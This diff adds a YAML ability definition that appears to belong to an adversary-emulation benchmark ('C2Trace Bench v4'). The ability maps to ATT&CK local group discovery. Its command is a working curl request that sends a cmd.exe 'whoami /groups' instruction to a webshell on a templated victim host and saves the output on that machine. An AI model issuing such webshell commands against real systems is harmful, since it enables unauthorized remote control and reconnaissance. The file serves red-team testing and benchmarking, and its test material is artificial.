@@ -1,0 +1,15 @@
+- id: dc934e5a-3184-5b6f-8535-a78cc2adfac5
+  name: CTID WebShell group discovery [MEP-WINDOWS-WEBSHELL-01]
+  description: C2Trace Bench v4 frozen ability.
+  tactic: discovery
+  technique:
+    attack_id: T1069.001
+    name: 'Permission Groups Discovery: Local Groups'
+  repeatable: false
+  platforms:
+    linux:
+      sh:
+        command: response=$(curl --fail --silent --show-error --max-time 20 -X POST --form-string 'c=cmd.exe /d /c "whoami
+          /groups > C:/Users/Public/#{c2trace.target_name}.groups.txt"' "http://#{c2trace.victim_ip}:#{c2trace.webshell_port}")
+          || exit $?; printf '%s\n' "$response"; printf '%s' "$response" | python3 -c 'import json,sys; d=json.load(sys.stdin);
+          bad=any(str(d.get(k) or "").strip() for k in ("Error","ErrorString")); sys.exit(1 if bad else 0)'
